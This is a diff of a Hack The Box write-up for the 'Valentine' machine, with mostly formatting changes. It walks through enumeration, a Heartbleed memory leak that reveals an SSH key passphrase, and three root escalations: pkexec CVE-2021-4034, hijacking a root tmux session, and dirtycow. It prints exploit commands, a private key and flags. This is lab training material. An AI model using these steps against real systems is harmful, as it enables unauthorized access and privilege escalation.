@@ -10,8 +10,8 @@ image:
   height: 400   # in pixels
 ---
 
-
 # Overview 
+
 This machine begins w/ a web enumeration, discovering `/dev` directory and `omg`, inside `/dev` contains a hex encoded string, decoding it reveals a encrypted SSH private key. Next, `omg` reveals an image of a bleeding heart, hinting us to use an exploit called heartbleed which allows us to obtain the passphrase of the SSH private key. Inturn, allowing us to obtain `hype` user.
 
 For the privilege escalation part, there are 3 ways to do so. The first way is through `CVE-2021-4034`, `polkit` is vulnerable, allowing us to privilege escalate to root. 
@@ -23,19 +23,20 @@ The final way is via a kernel exploit called `dirtycow`
 ---
 
 | Column       | Details                                                     |
-| ------------ | ----------------------------------------------------------- |
+|--------------|-------------------------------------------------------------|
 | Box Name     | Valentine                                                   |
-| IP           |    10.10.10.79                                                         |
-| Points       |   -                                                          |
+| IP           | 10.10.10.79                                                 |
+| Points       | -                                                           |
 | Difficulty   | Easy                                                        |
 | Creator      | [mrb3n](https://www.hackthebox.com/home/users/profile/2984) |
-| Release Date | 17-Feb-2018                                                            |
-
+| Release Date | 17-Feb-2018                                                 |
 
 # Recon
 
 ## TCP/80 (HTTP)
+
 ### FFUF - common.txt
+
 ```
 403      GET       10l       30w      287c http://10.10.10.79/cgi-bin/
 403      GET       10l       30w      292c http://10.10.10.79/cgi-bin/.html
@@ -48,11 +49,13 @@ The final way is via a kernel exploit called `dirtycow`
 200      GET        1l        2w       38c http://10.10.10.79/index.php
 403      GET       10l       30w      292c http://10.10.10.79/server-status
 ```
+
 - `encode.php`
 - `decode.php`
 - `/dev`
 
 ### FFUF - directory-list-2.3-medium.txt
+
 ```
 200      GET        1l        2w       38c http://10.10.10.79/index
 200      GET        1l        2w       38c http://10.10.10.79/index.php
@@ -63,13 +66,15 @@ The final way is via a kernel exploit called `dirtycow`
 200      GET       25l       54w      552c http://10.10.10.79/decode.php
 200      GET      620l     3539w   153356c http://10.10.10.79/omg
 ```
-- `omg`
 
+- `omg`
 
 # Initial Foothold
 
 ## TCP/80 (HTTP) - Found Private Key
+
 1. Found `hex` string at `http://valentine.htb/dev/hype_key`
+
 	```
 	┌──(root💀kali)-[~/htb/valentine/10.10.10.79/loot]
 	└─# wget http://10.10.10.79/dev/hype_key
@@ -87,7 +92,9 @@ The final way is via a kernel exploit called `dirtycow`
 	└─# head -c 200 hype_key 
 	2d 2d 2d 2d 2d 42 45 47 49 4e 20 52 53 41 20 50 52 49 56 41 54 45 20 4b 45 59 2d 2d 2d 2d 2d 0d 0a 50 72 6f 63 2d 54 79 70 65 3a 20 34 2c 45 4e 43 52 59 50 54 45 44 0d 0a 44 45 4b 2d 49 6e 66 6f 3a 20┌
 	```
+
 2. Decode it
+
 	```
 	┌──(root💀kali)-[~/htb/valentine/10.10.10.79/loot]
 	└─# cat hype_key | xxd -r -p | tee id_rsa
@@ -122,8 +129,10 @@ The final way is via a kernel exploit called `dirtycow`
 	RUgZkbMQZNIIfzj1QuilRVBm/F76Y/YMrmnM9k/1xSGIskwCUQ+95CGHJE8MkhD3
 	-----END RSA PRIVATE KEY-----┌
 	```
+
 	- `id_rsa` - Encrypted
 3. Crack it w/ john
+
 	```
 	# Convert to john format
 	┌──(root💀kali)-[~/htb/valentine/10.10.10.79/loot]
@@ -133,6 +142,7 @@ The final way is via a kernel exploit called `dirtycow`
 	┌──(root💀kali)-[~/htb/valentine/10.10.10.79/loot]
 	└─# john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa_john 
 	```
+
 	- Failed
 4. At this point me stuck, so I looked for nudges at [HackTheBox Forum](https://forum.hackthebox.com/t/valentine/445/)
 	- The picture at `index.php` is a hint
@@ -140,23 +150,32 @@ The final way is via a kernel exploit called `dirtycow`
 	
 
 ## TCP/443 (HTTPS) - Heartbleed
+
 1. Proceed to `http://valentine.htb`
 	 ![](Pasted%20image%2020220829030841.png)
 	 - Bleeding heart
 2. Search exploits named `bleed/heart`
 	
+
 	| Exploit Title                                                                      | Path                     |
+
 	| ---------------------------------------------------------------------------------- | ------------------------ |
+
 	| OpenSSL 1.0.1f TLS Heartbeat Extension - 'Heartbleed' Memory Disclosure (Multiple  | multiple/remote/32764.py |
+
 	| OpenSSL TLS Heartbeat Extension - 'Heartbleed' Information Leak (1)                | multiple/remote/32791.c  |
+
 	| OpenSSL TLS Heartbeat Extension - 'Heartbleed' Information Leak (2) (DTLS Support) | multiple/remote/32998.c  |
+
 	| OpenSSL TLS Heartbeat Extension - 'Heartbleed' Memory Disclosure                   | multiple/remote/32745.py |
+
 3. Try `multiple/remote/32764.py`
 	1. `32745.py`, did not work for me even though it looks the same
 	2. How does it work?
 		- This serious flaw (CVE-2014-0160) is a missing bounds check before a `memcpy()` call that uses non-sanitized user input as the length parameter. An attacker can trick OpenSSL into allocating a 64KB buffer, copy more bytes than is necessary into the buffer, send that buffer back, and thus leak the contents of the victim’s memory, 64KB at a time. - [Source](https://owasp.org/www-community/vulnerabilities/Heartbleed_Bug)
 		- This compromises the secret keys used to identify the service providers and to encrypt the traffic, the names and passwords of the users and the actual content. - [Source](https://heartbleed.com)
 	3. Run exploit, extract base64 output
+
 		```
 		┌──(root💀kali)-[~/htb/valentine/10.10.10.79/exploit]
 		└─# cat bleed.out 
@@ -198,47 +217,56 @@ The final way is via a kernel exploit called `dirtycow`
 		  0180: D2 81 18 3A 68 64 AE E9 57 93 E9 CE 14 B0 99 44  ...:hd..W......D
 		  0190: 76 11 55 2D 00 15 00 68 00 00 00 00 00 00 00 00  v.U-...h........
 		```
+
 		- `$text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==`
 	4. Decode it
+
 		```
 		┌──(root💀kali)-[~/htb/valentine/10.10.10.79/loot]
 		└─# echo aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg== | base64 -d
 		heartbleedbelievethehype	
 		```
+
 		- This should be the passphrase for the SSH private key
 
-
 ## TCP/22 (SSH)
+
 1. SSH w/ `hype:heartbleedbelievethehype`
+
 	```
 	┌──(root💀kali)-[~/htb/valentine/10.10.10.79/loot]
 	└─# chmod 600; ssh hype@valentine.htb -i id_rsa
 	```
+
 2. User Flag
+
 	```
 	e6710a5464769fd5fcd216e076961750
 	```
+
 	![](Pasted%20image%2020220829025828.png)
 
 # Privilege Escalation - 1 
 
 ## Root - Via CVE-2021-4034
+
 1. Found something interesting w/ `linpeas.sh`
 	![](Pasted%20image%2020220829035131.png)
 	- `CVE-2021-4034`
-1. Try `CVE-2021-4034.py`
+2. Try `CVE-2021-4034.py`
 	1. How does the exploit work?
 		- Polkit (formerly PolicyKit) is a component for controlling system-wide privileges in Unix-like operating systems. It provides an organized way for non-privileged processes to communicate with privileged processes.
 		- Due to an improper implementation of the pkexec tool, an out-of-bounds memory access can be leveraged by a local attacker to escalate their privileges to system root.
 	2. [Download Exploit](https://github.com/joeammond/CVE-2021-4034)
 	3. Transfer to `valentine.htb` 
 	4. Run Exploit
-2. Obtained `root` Shell & `root.txt`
+3. Obtained `root` Shell & `root.txt`
+
 	```
 	f1bb6d759df1f272914ebbc9ed7765b2
 	```
-	![](Pasted%20image%2020220829035444.png)
 
+	![](Pasted%20image%2020220829035444.png)
 
 # Privilege Escalation - 2
 
@@ -249,40 +277,47 @@ The final way is via a kernel exploit called `dirtycow`
 	- `tmux` - process running as root
 	- `/.devs/dev_sess`
 2. Check file privileges for `/.devs/dev_sess`
+
 	```
 	hype@Valentine:/tmp$ ls -la /.devs/dev_sess
 	srw-rw---- 1 root hype 0 Aug 27 13:49 /.devs/dev_sess
 	hype@Valentine:/tmp$ groups
 	hype cdrom dip plugdev sambashare
 	```
+
 	- user `hype` belongs to group `hype`
 	- group `hype` has `RW` access to `/.devs/dev_sess`
 	- This allows us to hijack the session running as `root`
 3. Hijack `tmux` to obtain `root`
+
 	```
 	hype@Valentine:/tmp$ tmux -S /.devs/dev_sess
 	```
+
 	![](vmware_s2COZodOHC.gif)
 
 # Privilege Escalation - 3
+
 ## Root - Via Kernel Exploit
+
 1. Identify linux kernel version
+
 	```
 	hype@Valentine:/tmp$ uname -a
 	Linux Valentine 3.2.0-23-generic #36-Ubuntu SMP Tue Apr 10 20:39:51 UTC 2012 x86_64 x86_64 x86_64 GNU/Linux
 	```
+
 	- `3.2.0-23-generic` - vulnerable to dirtycow
 2. Try `dirtycow` exploit
 	1. [How does the exploit work?](https://www.cs.toronto.edu/~arnold/427/18s/427_18S/indepth/dirty-cow/index.html)
 	2. [Download Exploit](https://www.exploit-db.com/exploits/40839)
 	3. Transfer to `valentine.htb` 
 	4. Run Exploit
+
 		```
 		hype@Valentine:/tmp$ gcc -pthread dirty.c -o dirty -lcrypt
 		hype@Valentine:/tmp$ ./dirty password
 		hype@Valentine:/tmp$ su firefart
 		```
+
 		![](Pasted%20image%2020220829042936.png)
-
-
-
